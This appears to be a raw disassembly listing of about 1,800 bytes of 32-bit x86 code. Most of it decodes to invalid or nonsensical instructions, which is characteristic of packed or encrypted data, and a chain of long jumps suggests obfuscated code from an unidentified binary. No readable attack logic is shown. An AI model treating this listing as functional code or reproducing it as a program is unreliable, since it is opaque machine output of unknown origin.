  41b698:	adc    BYTE PTR [ebx],ch
  41b69a:	loopne 0x41b68c
  41b69c:	sub    al,0x18
  41b69e:	xchg   BYTE PTR [edi+0x2682936b],dl
  41b6a4:	dec    ebp
  41b6a5:	aad    0xc6
  41b6a7:	xor    al,0x9f
  41b6a9:	sbb    al,0x1
  41b6ab:	(bad)  
  41b6ac:	out    0xc7,al
  41b6ae:	or     eax,0x48e2e85b
  41b6b3:	(bad)  
  41b6b5:	cmp    eax,0x4480f7dd
  41b6ba:	sub    ecx,DWORD PTR [esi+0x5c3cf7ad]
  41b6c0:	add    DWORD PTR [eax+edx*8+0x6f5bd1d7],ebx
  41b6c7:	mov    edi,0x898cfe0c
  41b6cc:	cwde   
  41b6cd:	fnsave [eax-0x310f3a5c]
  41b6d3:	cmp    eax,0xee31124c
  41b6d8:	push   esi
  41b6d9:	pop    ebp
  41b6da:	mov    al,ds:0xc133bddf
  41b6df:	add    eax,esi
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx+0x6d7468f6]
  41b6f4:	ins    BYTE PTR es:[edi],dx
  41b6f5:	mov    ecx,0x787fe0d8
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b6d1
  41b6ff:	imul   eax,DWORD PTR [ebp-0x5cde8d65],0x65
  41b706:	imul   esi,DWORD PTR [esi],0x308a6179
  41b70c:	and    DWORD PTR [ebx],esp
  41b70e:	fidivr WORD PTR [ebp+eiz*1+0x6e032468]
  41b715:	and    BYTE PTR [ebp+edx*2-0x30],cl
  41b719:	xor    al,0xed
  41b71b:	aad    0x25
  41b71d:	sbb    bh,BYTE PTR [edi+0x25]
  41b720:	push   edi
  41b721:	mov    dh,0x2f
  41b723:	lock xchg BYTE PTR [ebx],al
  41b726:	and    dl,BYTE PTR [esi]
  41b728:	jnp    0x41b6b3
  41b72a:	icebp  
  41b72b:	mov    cl,0x45
  41b72d:	pop    es
  41b72e:	fwait
  41b72f:	(bad)  
  41b730:	mov    edx,DWORD PTR [edi+edx*8+0x46e0c6a9]
  41b737:	pushf  
  41b738:	bound  eax,QWORD PTR [ecx+ebp*4+0x49]
  41b73c:	pop    ss
  41b73d:	jmp    0x18c4ad12
  41b742:	out    0xa8,eax
  41b744:	push   ss
  41b745:	add    dh,BYTE PTR [ecx+0xfa2709b]
  41b74b:	test   ch,cl
  41b74d:	mov    eax,ds:0xbfbdcda4
  41b752:	sbb    eax,0xd5eb97b0
  41b757:	fldcw  WORD PTR [ecx+0xa]
  41b75a:	dec    esi
  41b75b:	xchg   ebp,eax
  41b75c:	mov    DWORD PTR [eax+edi*8+0x70],ebp
  41b760:	stc    
  41b761:	adc    cl,dl
  41b763:	int    0xae
  41b765:	push   0x70265024
  41b76a:	(bad)  
  41b76b:	xor    ecx,ebp
  41b76d:	gs fs xchg ebx,eax
  41b770:	or     ebx,DWORD PTR [esi+0x34d32c10]
  41b776:	ficom  WORD PTR [eax+0xf]
  41b779:	cs dec esp
  41b77b:	xor    ebp,0xffffff9a
  41b77e:	scas   al,BYTE PTR es:[edi]
  41b77f:	hlt    
  41b780:	jns    0x41b7f5
  41b782:	mov    dh,0xa7
  41b784:	icebp  
  41b785:	jns    0x41b797
  41b787:	cmc    
  41b788:	dec    edx
  41b789:	scas   eax,DWORD PTR es:[edi]
  41b78a:	and    BYTE PTR ds:0x5486892f,0x81
  41b791:	mov    ebx,0x551df771
  41b796:	in     al,dx
  41b797:	data16 rol dl,0x45
  41b79b:	sbb    edi,DWORD PTR [edx-0x33]
  41b79e:	push   ebx
  41b79f:	xchg   edi,eax
  41b7a0:	in     al,0xdb
  41b7a2:	dec    esp
  41b7a3:	out    dx,al
  41b7a4:	xlat   BYTE PTR ds:[ebx]
  41b7a5:	retf   0xc830
  41b7a8:	or     BYTE PTR [ebx-0xf],ch
  41b7ab:	jge    0x41b786
  41b7ad:	xchg   esi,eax
  41b7ae:	addr16 nop
  41b7b0:	xchg   ebp,eax
  41b7b1:	inc    ebp
  41b7b2:	inc    ebx
  41b7b3:	jle    0x41b7df
  41b7b5:	push   edi
  41b7b6:	arpl   WORD PTR [edi],dx
  41b7b8:	and    eax,0x404fb73c
  41b7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7be:	push   ebx
  41b7bf:	in     al,0x56
  41b7c1:	fadd   st(0),st
  41b7c3:	pop    ebp
  41b7c4:	cli    
  41b7c5:	cmp    al,0xb
  41b7c7:	xlat   BYTE PTR ds:[ebx]
  41b7c8:	test   eax,esi
  41b7ca:	lahf   
  41b7cb:	mov    ch,0x81
  41b7cd:	enter  0xb403,0xb2
  41b7d1:	int3   
  41b7d2:	xchg   BYTE PTR [esi-0x2c],dl
  41b7d5:	jbe    0x41b7af
  41b7d7:	adc    esp,DWORD PTR [ebp+0x57048b76]
  41b7dd:	mov    eax,ds:0xea46e3f6
  41b7e2:	or     BYTE PTR [edx],al
  41b7e4:	jo     0x41b85b
  41b7e6:	cmp    ecx,eax
  41b7e8:	push   0x78
  41b7ea:	ins    DWORD PTR es:[edi],dx
  41b7eb:	xchg   edx,eax
  41b7ec:	inc    edi
  41b7ed:	lea    edi,ds:0x8d305519
  41b7f3:	cs xchg esp,eax
  41b7f5:	add    esi,DWORD PTR [edi+0x18]
  41b7f8:	outs   dx,DWORD PTR ds:[esi]
  41b7f9:	shl    cl,cl
  41b7fb:	sub    ch,ch
  41b7fd:	mov    ds:0x3a86d76e,eax
  41b802:	test   eax,0x74e9ac77
  41b807:	sbb    eax,0x756ef2d2
  41b80c:	inc    esp
  41b80d:	push   0x4641c0a5
  41b812:	inc    eax
  41b813:	shl    DWORD PTR [edi],0x2
  41b816:	add    esp,DWORD PTR [ebx+0x76860947]
  41b81c:	neg    ebx
  41b81e:	scas   al,BYTE PTR es:[edi]
  41b81f:	and    cl,BYTE PTR [ecx+0x3b]
  41b822:	dec    eax
  41b823:	or     DWORD PTR [esi],ebx
  41b825:	adc    al,0x3
  41b827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b828:	jmp    0x41b85b
  41b82a:	aad    0xb7
  41b82c:	dec    esi
  41b82d:	ret    
  41b82e:	dec    esi
  41b82f:	loop   0x41b8a9
  41b831:	ins    DWORD PTR es:[edi],dx
  41b832:	sbb    ebx,edi
  41b834:	les    eax,FWORD PTR [eax*8-0x5a9f033e]
  41b83b:	xchg   esp,eax
  41b83c:	or     DWORD PTR [ecx],esi
  41b83e:	loop   0x41b88f
  41b840:	jmp    0x990c:0xab5d44cd
  41b847:	or     al,0x63
  41b849:	push   0xf30c79f8
  41b84e:	rol    dh,0x34
  41b851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b852:	cs nop
  41b854:	sbb    bh,BYTE PTR [esi-0x8]
  41b857:	jl     0x41b860
  41b859:	icebp  
  41b85a:	shl    DWORD PTR [ebp+0x21],0xe2
  41b85e:	jno    0x41b7e7
  41b860:	pop    ecx
  41b861:	fldcw  WORD PTR [esp+eiz*8]
  41b864:	xor    dh,BYTE PTR gs:[edx-0x7a493d25]
  41b86b:	fild   DWORD PTR [esi-0x73]
  41b86e:	pusha  
  41b86f:	aaa    
  41b870:	mov    eax,ds:0x6abffcb3
  41b875:	push   esp
  41b876:	ins    DWORD PTR es:[edi],dx
  41b877:	dec    esi
  41b878:	dec    eax
  41b879:	inc    ebp
  41b87a:	jae    0x41b867
  41b87c:	mov    bh,0x7c
  41b87e:	mov    dl,0xe4
  41b880:	popf   
  41b881:	adc    esi,DWORD PTR [esi+0xc]
  41b884:	vandnpd xmm2,xmm5,xmm6
  41b888:	xchg   ebx,eax
  41b889:	xchg   DWORD PTR [esi-0x14],edx
  41b88c:	fcmove st,st(3)
  41b88e:	(bad)  
  41b88f:	aaa    
  41b890:	pop    ecx
  41b891:	pop    esp
  41b892:	dec    ebx
  41b893:	adc    DWORD PTR [esp+ebx*8+0x1d],ebx
  41b897:	inc    edi
  41b898:	jmp    0xf93b:0x2fe6772a
  41b89f:	(bad)
  41b8a4:	pop    es
  41b8a5:	push   esp
  41b8a6:	aaa    
  41b8a7:	daa    
  41b8a8:	dec    ebx
  41b8a9:	data16 shl dl,0x9b
  41b8ad:	retf   
  41b8ae:	ret    0x5253
  41b8b1:	sbb    esi,edx
  41b8b3:	cmc    
  41b8b4:	or     edi,0xfe02637c
  41b8ba:	mov    ch,0xca
  41b8bc:	ds inc edi
  41b8be:	inc    esi
  41b8bf:	test   DWORD PTR [ebx],edx
  41b8c1:	aam    0x9e
  41b8c3:	inc    eax
  41b8c4:	loop   0x41b860
  41b8c6:	sub    DWORD PTR [edi+edx*8-0x12958b00],edx
  41b8cd:	ret    
  41b8ce:	popf   
  41b8cf:	jp     0x41b88b
  41b8d1:	pop    esp
  41b8d2:	dec    edi
  41b8d3:	popf   
  41b8d4:	dec    edx
  41b8d5:	dec    esp
  41b8d6:	inc    ebx
  41b8d7:	rcr    eax,0xee
  41b8da:	or     DWORD PTR [edi],ebx
  41b8dc:	fdivp  st(2),st
  41b8de:	jnp    0x41b86f
  41b8e0:	out    0x45,al
  41b8e2:	js     0x41b8ce
  41b8e4:	mov    eax,ds:0x384c5c6e
  41b8e9:	inc    ebp
  41b8ea:	std    
  41b8eb:	mov    edx,0x657dd198
  41b8f0:	stos   BYTE PTR es:[edi],al
  41b8f1:	pop    eax
  41b8f2:	xchg   edx,eax
  41b8f3:	mov    bh,0x6b
  41b8f5:	jno    0x41b938
  41b8f7:	xchg   BYTE PTR [esi-0x67],ch
  41b8fa:	(bad)  
  41b8fc:	frstor [eax+esi*2-0x10]
  41b900:	aam    0x32
  41b902:	(bad)  
  41b903:	jl     0x41b943
  41b905:	jns    0x41b8a0
  41b907:	ins    BYTE PTR es:[edi],dx
  41b908:	inc    eax
  41b909:	(bad)  
  41b90a:	(bad)  [ebx-0x319964b1]
  41b910:	mov    ecx,0xd54cacca
  41b915:	push   esp
  41b916:	imul   eax,DWORD PTR [edx]
  41b919:	mov    edx,DWORD PTR [ebp-0x4]
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x6b2deca]
  41b92f:	ins    BYTE PTR es:[edi],dx
  41b930:	jb     0x41b922
  41b932:	out    0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b98e
  41b93a:	add    al,0xfd
  41b93c:	fbstp  TBYTE PTR [edi-0xb]
  41b93f:	fdivr  QWORD PTR [ecx]
  41b941:	mov    edx,0xad5561ed
  41b946:	adc    BYTE PTR [ecx],dl
  41b948:	ret    
  41b949:	ret    
  41b94a:	mov    ch,0x5b
  41b94c:	fnstenv [ebx]
  41b94e:	push   ebp
  41b94f:	je     0x41b997
  41b951:	xchg   esi,eax
  41b952:	mov    bh,0x76
  41b954:	pop    esi
  41b955:	pop    ebp
  41b956:	pop    esp
  41b957:	stos   DWORD PTR es:[edi],eax
  41b958:	pop    ecx
  41b959:	loopne 0x41b9d3
  41b95b:	cmp    dx,ax
  41b95e:	mov    eax,ds:0x919ec1d8
  41b963:	sub    eax,0x1f595a00
  41b968:	inc    esp
  41b969:	lods   eax,DWORD PTR ds:[esi]
  41b96a:	cpuid  
  41b96c:	in     eax,dx
  41b96d:	je     0x41b9b9
  41b96f:	cs pop ebx
  41b971:	add    esi,DWORD PTR [edi+ebx*8-0x13]
  41b975:	mov    ebp,DWORD PTR [ebp+0x43]
  41b978:	arpl   WORD PTR [ebx+edi*4-0x40eac3df],bx
  41b97f:	imul   eax,DWORD PTR fs:[esi],0x39
  41b983:	jp     0x41b977
  41b985:	stc    
  41b986:	push   edi
  41b987:	mov    bh,BYTE PTR [eax]
  41b989:	pop    edx
  41b98a:	iret   
  41b98b:	mov    ecx,0x7934ec3f
  41b990:	shr    ch,1
  41b992:	cmp    al,0x52
  41b994:	xor    eax,esp
  41b996:	sti    
  41b997:	daa    
  41b998:	fdiv   QWORD PTR [edx]
  41b99a:	sbb    ah,BYTE PTR [ecx]
  41b99c:	sti    
  41b99d:	ficom  WORD PTR [ebp-0x15]
  41b9a0:	jg     0x41b996
  41b9a2:	fsub   DWORD PTR [ebp-0x5]
  41b9a5:	fdivrp st(6),st
  41b9a7:	xlat   BYTE PTR ds:[ebx]
  41b9a8:	pop    ecx
  41b9a9:	mov    ebp,DWORD PTR [edx]
  41b9ab:	and    BYTE PTR [edx],0x24
  41b9ae:	mov    edi,0x72c324cf
  41b9b3:	sbb    BYTE PTR [eax+0x70],ah
  41b9b6:	pop    ds
  41b9b7:	test   al,0xf8
  41b9b9:	mov    edi,DWORD PTR [esi+0x1a]
  41b9bc:	mov    ebp,0xa42015d4
  41b9c1:	pop    edi
  41b9c2:	mov    ebp,0x24231d8c
  41b9c7:	jno    0x41ba1e
  41b9c9:	gs sub DWORD PTR fs:[edx-0x27],ebx
  41b9ce:	push   edx
  41b9cf:	fwait
  41b9d0:	inc    edi
  41b9d1:	and    al,0x8e
  41b9d3:	sub    al,0xa2
  41b9d5:	ins    BYTE PTR es:[edi],dx
  41b9d6:	xchg   ebx,eax
  41b9d7:	pop    ebx
  41b9d8:	or     eax,DWORD PTR [eax-0x2d]
  41b9db:	dec    esp
  41b9dc:	cmp    esp,DWORD PTR [ecx+0x19]
  41b9df:	std    
  41b9e0:	inc    ebx
  41b9e1:	mov    ds:0xf874dbfc,al
  41b9e6:	nop
  41b9e7:	mov    bh,0x95
  41b9e9:	ror    ebx,cl
  41b9eb:	leave  
  41b9ec:	hlt    
  41b9ed:	jmp    0x41ba6d
  41b9ef:	jno    0x41ba37
  41b9f1:	cmp    cl,BYTE PTR [ebx+0x76f6a848]
  41b9f7:	jbe    0x41ba23
  41b9f9:	jmp    0x41ba79
  41b9fb:	std    
  41b9fc:	aad    0xe1
  41b9fe:	stos   BYTE PTR es:[edi],al
  41b9ff:	fiadd  WORD PTR [eax+0x6e5d784b]
  41ba05:	push   eax
  41ba06:	xor    eax,DWORD PTR [esi-0x3e]
  41ba09:	aaa    
  41ba0a:	(bad)
  41ba0e:	in     eax,dx
  41ba0f:	(bad)  
  41ba10:	adc    al,BYTE PTR [ebx]
  41ba12:	jge    0x41b9cb
  41ba14:	mov    eax,0x992a63cf
  41ba19:	pop    edi
  41ba1a:	mov    bh,0x24
  41ba1c:	cmp    al,0xe0
  41ba1e:	loope  0x41ba6b
  41ba20:	cmp    BYTE PTR [ebx+0x5e],bh
  41ba23:	push   ecx
  41ba24:	sub    al,0x39
  41ba26:	dec    ebx
  41ba27:	fcom   st(2)
  41ba29:	adc    al,0xa3
  41ba2b:	adc    ch,bh
  41ba2d:	mov    al,0x38
  41ba2f:	push   cs
  41ba30:	lods   eax,DWORD PTR ds:[esi]
  41ba31:	pop    ss
  41ba32:	pusha  
  41ba33:	lock sbb cl,BYTE PTR ss:[eax-0x61]
  41ba38:	jns    0x41ba9c
  41ba3a:	fxch   st(2)
  41ba3c:	xor    al,0x32
  41ba3e:	(bad)  
  41ba3f:	outs   dx,DWORD PTR ds:[esi]
  41ba40:	push   ebp
  41ba41:	mov    ah,BYTE PTR [edi]
  41ba43:	test   DWORD PTR [esi+0x9],0x6009d4d1
  41ba4a:	or     BYTE PTR [edi-0x66],0xd
  41ba4e:	push   eax
  41ba4f:	test   DWORD PTR [eax],eax
  41ba51:	inc    ecx
  41ba52:	mov    ch,0x29
  41ba54:	xor    eax,DWORD PTR [ebx-0x29430258]
  41ba5a:	test   DWORD PTR [ebp+0x5d],0xc01faf69
  41ba61:	xchg   ecx,eax
  41ba62:	adc    ch,BYTE PTR [ebx+0x18]
  41ba65:	retf   0x213b
  41ba68:	std    
  41ba69:	aad    0xc4
  41ba6b:	les    eax,FWORD PTR [ebx+edi*2]
  41ba6e:	mov    WORD PTR [ecx+0x28],es
  41ba71:	(bad)  
  41ba73:	push   edx
  41ba74:	popf   
  41ba75:	inc    ebx
  41ba77:	cmp    DWORD PTR [edi-0x61],0x12
  41ba7b:	jns    0x41bad3
  41ba7d:	or     DWORD PTR [edi-0x72],esi
  41ba80:	aaa    
  41ba81:	sbb    ch,BYTE PTR [edx]
  41ba83:	sub    edi,0x40
  41ba86:	xor    cl,BYTE PTR [ecx+0x5c]
  41ba89:	sti    
  41ba8a:	xchg   BYTE PTR [edi+0x31],al
  41ba8d:	push   ss
  41ba8e:	sbb    al,cl
  41ba90:	inc    edx
  41ba91:	jb     0x41ba2a
  41ba93:	add    ch,dl
  41ba95:	inc    edi
  41ba96:	push   edx
  41ba97:	xchg   BYTE PTR [esi+ecx*8+0x2511363d],dh
  41ba9e:	clc    
  41ba9f:	leave  
  41baa0:	sbb    al,0xcd
  41baa2:	push   ecx
  41baa3:	push   ss
  41baa4:	pushf  
  41baa5:	aad    0x99
  41baa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baa8:	cmp    BYTE PTR [ebx-0x3e],dl
  41baab:	loope  0x41ba54
  41baad:	repz jns 0x41ba58
  41bab0:	neg    BYTE PTR [ecx]
  41bab2:	pop    eax
  41bab3:	out    0xbe,al
  41bab5:	nop
  41bab6:	mov    esp,DWORD PTR [esi-0x405f4a42]
  41babc:	loopne 0x41ba56
  41babe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41babf:	inc    ebx
  41bac0:	mov    ah,0x42
  41bac2:	cdq    
  41bac3:	xor    bl,bh
  41bac5:	gs jae 0x41ba49
  41bac8:	fsub   DWORD PTR [esi+ebp*2+0x3ae63c76]
  41bacf:	fimul  DWORD PTR [eax-0x3c]
  41bad2:	inc    edx
  41bad3:	mov    bl,0x2e
  41bad5:	cwde   
  41bad6:	(bad)  
  41bad7:	inc    edi
  41bad8:	out    0xcc,al
  41bada:	push   es
  41badb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41badc:	iret   
  41badd:	(bad)  
  41bade:	stos   BYTE PTR es:[edi],al
  41badf:	jle    0x41ba86
  41bae1:	(bad)  
  41bae2:	sbb    ecx,DWORD PTR [ebx+0x46]
  41bae5:	jl     0x41bb30
  41bae7:	and    esp,eax
  41bae9:	adc    BYTE PTR ds:0x52eb3167,al
  41baef:	cwde   
  41baf0:	call   0xb9581684
  41baf5:	ins    DWORD PTR es:[edi],dx
  41baf6:	xor    ebx,DWORD PTR [esi-0x3435a9a4]
  41bafc:	pop    esi
  41bafd:	xchg   ebx,eax
  41bafe:	xchg   ebx,eax
  41baff:	leave  
  41bb00:	xchg   BYTE PTR [ebx+ecx*2-0x5ae4a07e],al
  41bb07:	fbstp  TBYTE PTR [ebp-0x3c39f0b]
  41bb0d:	or     al,0xa4
  41bb0f:	xchg   ebx,eax
  41bb10:	mov    ds:0x9d93894b,eax
  41bb15:	adc    edx,esi
  41bb17:	icebp  
  41bb18:	lds    ebp,FWORD PTR [esi+0x69]
  41bb1b:	(bad)  
  41bb1c:	test   al,0x23
  41bb1e:	(bad)  
  41bb1f:	in     al,dx
  41bb20:	sub    bh,al
  41bb22:	lods   al,BYTE PTR ds:[esi]
  41bb23:	sub    DWORD PTR [esi+0x3335c73f],0x4da511f5
  41bb2d:	inc    ecx
  41bb2e:	mov    BYTE PTR [ecx-0x68d543c6],ah
  41bb34:	lock aaa 
  41bb36:	sub    al,0x1d
  41bb38:	test   eax,0x2a2fff7d
  41bb3d:	dec    eax
  41bb3e:	loopne 0x41bae7
  41bb40:	mov    WORD PTR [edi+0xee6e327],?
  41bb46:	mov    bl,0xa5
  41bb48:	push   0x15
  41bb4a:	sar    DWORD PTR [ebx-0x103a3f98],cl
  41bb50:	scas   eax,DWORD PTR es:[edi]
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xef17bf12
  41bb65:	mov    ah,0x5e
  41bb67:	js     0x10ba3b51
  41bb6d:	jle    0x41bbe7
  41bb6f:	js     0x41bb34
  41bb71:	test   eax,0x63e37e29
  41bb76:	repz sahf 
  41bb78:	nop
  41bb79:	mov    cs,WORD PTR ds:0x4e865b3c
  41bb7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb80:	jle    0x41bb14
  41bb82:	sbb    eax,0x6678c92b
  41bb87:	in     al,0x7f
  41bb89:	sbb    ebx,DWORD PTR ss:0x4df7df47
  41bb90:	fadd   QWORD PTR [ebx+0x74bc38c1]
  41bb96:	(bad)  [esi+eax*1-0x2a430b84]
  41bb9d:	push   eax
  41bb9e:	mov    edx,0x81876801
  41bba3:	setb   BYTE PTR [ecx+0x6b]
  41bba7:	dec    ecx
  41bba8:	pop    edi
  41bba9:	sbb    eax,DWORD PTR [esi-0x41]
  41bbac:	mov    edx,0x655f698e
  41bbb1:	jne    0x41bc11
  41bbb3:	leave  
  41bbb4:	cmp    edx,DWORD PTR [eax+edi*1-0x6cd67477]
  41bbbb:	mov    ebx,0x203ef1f8
  41bbc0:	les    ebx,FWORD PTR [ecx+0x7b]
  41bbc3:	xchg   ebp,eax
  41bbc4:	jp     0x41bb90
  41bbc6:	cmp    ah,BYTE PTR [ebx-0x48976e31]
  41bbcc:	mov    al,0xd4
  41bbce:	imul   edi,DWORD PTR [esi+0x6f],0x1b
  41bbd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbd4:	jmp    0x3bb1:0x796a77a9
  41bbdb:	ja     0x41bbbd
  41bbdd:	adc    BYTE PTR [eax],0x6c
  41bbe0:	mov    esi,0xcefe258f
  41bbe5:	ds jl  0x41bbce
  41bbe8:	adc    al,0x85
  41bbea:	jbe    0x41bbf5
  41bbec:	mov    cl,0x48
  41bbee:	mov    edx,0x7af5d728
  41bbf3:	repnz aas 
  41bbf5:	push   es
  41bbf6:	xchg   ch,bl
  41bbf8:	jne    0x41bc11
  41bbfa:	mov    edx,DWORD PTR [esi-0x64d07325]
  41bc00:	or     eax,0x27c75f04
  41bc05:	(bad)  
  41bc06:	cwde   
  41bc07:	das    
  41bc08:	lahf   
  41bc09:	stc    
  41bc0a:	or     DWORD PTR [ebx+0x32111b3],0x34
  41bc11:	ds popw ds
  41bc14:	retf   
  41bc15:	mov    edx,0x68429bfd
  41bc1a:	xchg   edx,eax
  41bc1b:	inc    ecx
  41bc1c:	jmp    0x3bcf:0xfeff4fa2
  41bc23:	stos   DWORD PTR es:[edi],eax
  41bc24:	and    BYTE PTR [eax],al
  41bc26:	idiv   ch
  41bc28:	mov    ch,0x32
  41bc2a:	mov    bh,0xc4
  41bc2c:	out    dx,al
  41bc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc2e:	ror    DWORD PTR [ebx-0x7e],0x7
  41bc32:	or     al,0xe1
  41bc34:	inc    edx
  41bc35:	test   al,0x19
  41bc37:	ret    0x9459
  41bc3a:	cmp    DWORD PTR [ecx+0x4e9b4018],eax
  41bc40:	or     eax,0x29225811
  41bc45:	push   edi
  41bc46:	icebp  
  41bc47:	clts   
  41bc49:	imul   esp,DWORD PTR [eax+ecx*8],0x4a
  41bc4d:	push   ds
  41bc4e:	mov    eax,0xdd0ebf22
  41bc53:	stos   DWORD PTR es:[edi],eax
  41bc54:	in     eax,0x4c
  41bc56:	sbb    cl,BYTE PTR [edx-0x17]
  41bc59:	inc    edi
  41bc5a:	fst    QWORD PTR [ecx-0x7b4ab99c]
  41bc60:	fcom   QWORD PTR [edi+0x4f]
  41bc63:	aas    
  41bc64:	inc    edx
  41bc65:	jle    0x41bc3a
  41bc67:	rcr    BYTE PTR [edx],1
  41bc69:	pop    ebp
  41bc6a:	sub    eax,0x4d7202a6
  41bc6f:	pop    edx
  41bc70:	call   ecx
  41bc72:	pusha  
  41bc73:	fisttp WORD PTR [edi]
  41bc75:	cli    
  41bc76:	jle    0x41bcce
  41bc78:	push   ss
  41bc79:	pop    es
  41bc7a:	mov    dh,0x26
  41bc7c:	ins    DWORD PTR es:[edi],dx
  41bc7d:	into   
  41bc7e:	lea    esi,[eax+0x1f]
  41bc81:	push   ss
  41bc82:	ins    DWORD PTR es:[edi],dx
  41bc83:	jge    0x41bc0e
  41bc85:	or     BYTE PTR [eax+0x3bdb4cfa],ah
  41bc8b:	sub    DWORD PTR [edi+ecx*8-0x6d62f3b8],esp
  41bc92:	mov    ecx,0x599e8be6
  41bc97:	jae    0x41bc5b
  41bc99:	push   ebp
  41bc9a:	popf   
  41bc9b:	repnz dec esp
  41bc9d:	retf   0x6646
  41bca0:	stc    
  41bca1:	fwait
  41bca2:	dec    ebx
  41bca3:	mov    eax,0x429b45b6
  41bca8:	ficom  DWORD PTR [ebp-0x3920127f]
  41bcae:	js     0x41bc54
  41bcb0:	repz aad 0x25
  41bcb3:	mov    eax,0xfdfe8ef1
  41bcb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb9:	xchg   DWORD PTR [ebx-0x5f7fee3],ebx
  41bcbf:	sub    dh,BYTE PTR [esi+0x7b]
  41bcc2:	outs   dx,DWORD PTR ds:[esi]
  41bcc3:	inc    esi
  41bcc4:	nop
  41bcc5:	and    BYTE PTR [esi+0x64],al
  41bcc8:	pop    es
  41bcc9:	jbe    0x41bc67
  41bccb:	iret   
  41bccc:	jns    0x41bd49
  41bcce:	or     ah,cl
  41bcd0:	push   cs
  41bcd1:	mov    bl,0x61
  41bcd3:	sub    eax,0x6d34d8c
  41bcd8:	scas   al,BYTE PTR es:[edi]
  41bcd9:	and    BYTE PTR [ecx],dl
  41bcdb:	shr    DWORD PTR [edx],0x5c
  41bcde:	ins    BYTE PTR es:[edi],dx
  41bcdf:	fstp   TBYTE PTR [ecx+0x3aca764d]
  41bce5:	and    ah,BYTE PTR [esi+0x7d]
  41bce8:	mov    eax,0xcd96f88
  41bced:	lods   eax,DWORD PTR ds:[esi]
  41bcee:	xchg   edx,eax
  41bcef:	stc    
  41bcf0:	xchg   ebx,eax
  41bcf1:	inc    esi
  41bcf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcf3:	aad    0xcc
  41bcf5:	nop
  41bcf6:	inc    ebx
  41bcf7:	xchg   DWORD PTR [ecx+ecx*1],ebx
  41bcfa:	adc    bl,BYTE PTR [esi+0x6a593d11]
  41bd00:	jmp    0xa1fa22d9
  41bd05:	xchg   edx,eax
  41bd06:	pop    es
  41bd07:	xchg   esi,eax
  41bd08:	imul   ebp,DWORD PTR [ebx+eax*2],0xffffffef
  41bd0c:	dec    eax
  41bd0d:	outs   dx,BYTE PTR ds:[esi]
  41bd0e:	das    
  41bd0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd10:	jno    0x41bcfc
  41bd12:	push   0x25ad6388
  41bd17:	out    dx,eax
  41bd18:	jl     0x41bd5b
  41bd1a:	les    eax,FWORD PTR [edx-0xd]
  41bd1d:	cmp    edx,eax
  41bd1f:	out    0xa2,eax
  41bd21:	sbb    ah,bh
  41bd23:	out    dx,al
  41bd24:	jbe    0x41bd3d
  41bd26:	arpl   WORD PTR [edx-0x7be4345f],bp
  41bd2c:	lahf   
  41bd2d:	push   ebx
  41bd2e:	xchg   ebx,eax
  41bd2f:	or     eax,0x7d561bd0
  41bd34:	int    0x42
  41bd36:	lock sbb BYTE PTR [edi+edi*2],dl
  41bd3a:	mov    bl,0x72
  41bd3c:	loop   0x41bd43
  41bd3e:	cmp    ah,BYTE PTR [esi-0x79a9db1b]
  41bd44:	pop    edi
  41bd45:	sbb    dh,BYTE PTR [eax]
  41bd47:	stos   DWORD PTR es:[edi],eax
  41bd48:	imul   esp,DWORD PTR ds:0xc92733e0,0x4e914777
  41bd52:	xchg   esi,eax
  41bd53:	loopne 0x41bdc9
  41bd55:	and    al,0x49
  41bd57:	mov    eax,ds:0x8cd4c3ea
  41bd5c:	rol    DWORD PTR [edx-0x78],1
  41bd5f:	iret   
  41bd60:	js     0x41bcec
  41bd62:	dec    ebx
  41bd63:	iret   
  41bd64:	jle    0x41bcfd
  41bd66:	push   ds
  41bd67:	pop    ss
  41bd68:	lods   eax,DWORD PTR ds:[esi]
  41bd69:	and    cl,BYTE PTR [ecx]
  41bd6b:	mov    al,0x6
  41bd6d:	dec    ecx
  41bd6e:	mov    ds:0x34302211,al
  41bd73:	adc    BYTE PTR [ebx+0x11],0xbb
  41bd77:	ror    BYTE PTR [ebx+edi*1-0x64fc7d10],0xc8
  41bd7f:	mov    bh,0x74
  41bd81:	sbb    esp,DWORD PTR [eax-0xf8facd]
  41bd87:	(bad)  
  41bd88:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xffffff96
  41bd9d:	fsubr  st(2),st
  41bd9f:	in     eax,dx
  41bda0:	mov    al,ds:0x10787fea
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41bdf2
  41bda9:	sbb    eax,0xcd1d0068
  41bdae:	fs pop esp
  41bdb0:	test   DWORD PTR [esi-0x73],edx
  41bdb3:	jmp    0x7126:0xc9b69944
  41bdba:	xor    BYTE PTR [edx+edx*1],dl
  41bdbd:	loop   0x41bd4f
  41bdbf:	inc    ecx
